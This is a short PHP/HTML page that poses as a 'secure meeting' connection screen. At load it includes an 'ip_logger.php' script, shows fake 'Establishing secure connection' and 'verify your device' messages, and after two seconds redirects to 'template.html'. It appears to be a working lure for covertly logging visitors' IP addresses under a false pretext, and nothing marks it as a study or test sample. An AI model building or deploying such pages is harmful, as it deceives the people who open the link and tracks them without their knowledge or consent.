<?php
include 'ip_logger.php';
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Connecting to secure meeting...</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #0a0a0a;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .loader-container {
            text-align: center;
            padding: 20px;
        }
        .goat-loader {
            font-size: 80px;
            animation: bounce 1s ease infinite;
            display: inline-block;
        }
        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-20px); }
        }
        .status-text {
            color: #fff;
            margin-top: 20px;
            font-size: 18px;
        }
        .spinner {
            width: 50px;
            height: 50px;
            border: 4px solid rgba(255,255,255,0.1);
            border-left-color: #4CAF50;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader-container">
        <div class="goat-loader">🐐</div>
        <div class="spinner"></div>
        <div class="status-text">Establishing secure connection...</div>
        <div class="status-text" style="font-size: 14px; color: #888; margin-top: 10px;">Please wait while we verify your device</div>
    </div>
    
    <script>
        setTimeout(function() {
            window.location.href = 'template.html';
        }, 2000);
    </script>
</body>
</html>